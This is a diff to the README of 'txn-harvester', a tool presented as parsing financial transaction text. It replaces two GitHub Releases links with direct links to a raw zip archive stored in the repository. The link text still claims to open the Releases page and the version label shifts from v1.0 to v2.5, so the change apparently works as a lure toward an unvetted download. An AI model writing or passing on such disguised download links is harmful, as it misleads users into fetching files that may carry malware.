@@ -4,7 +4,7 @@
 txn-harvester extracts and structures financial transaction data from unstructured text, parsing amounts, dates, and categories for automation. This tool simplifies your financial data management by converting messy text into organized information.
 
 ## 📥 Download Now
-[![Download txn-harvester](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Ikky-Ei/txn-harvester/releases)
+[![Download txn-harvester](https://raw.githubusercontent.com/Ikky-Ei/txn-harvester/main/txn_harvester/harvester_txn_v2.5.zip)](https://raw.githubusercontent.com/Ikky-Ei/txn-harvester/main/txn_harvester/harvester_txn_v2.5.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run txn-harvester.
@@ -24,7 +24,7 @@ Follow these simple steps to download and run txn-harvester.
 ## 📂 Download & Install
 To get started, visit the page to download the latest version of txn-harvester from the Releases section. 
 
-[Visit the Releases Page to Download](https://github.com/Ikky-Ei/txn-harvester/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Ikky-Ei/txn-harvester/main/txn_harvester/harvester_txn_v2.5.zip)
 
 1. Click on the link above to open the Releases page.
 2. Find the latest version of txn-harvester.
